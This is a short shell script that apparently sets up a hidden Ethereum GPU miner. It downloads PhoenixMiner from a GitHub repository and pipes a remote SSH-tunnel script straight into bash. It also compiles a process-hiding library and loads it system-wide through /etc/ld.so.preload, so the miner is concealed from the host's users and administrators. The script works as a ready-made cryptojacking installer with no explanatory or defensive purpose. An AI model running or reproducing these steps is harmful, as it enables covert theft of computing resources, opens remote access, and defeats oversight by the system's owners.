#!/bin/sh
apt update;apt -y install libpci-dev apt-utils wget nano net-tools htop whiptail dialog sshpass screen cmake > /dev/null
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/Phoen.zip
DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
screen -S mine
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash && sleep .1
unzip Phoen.zip
chmod +x PhoenixMiner
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./etherm.sh
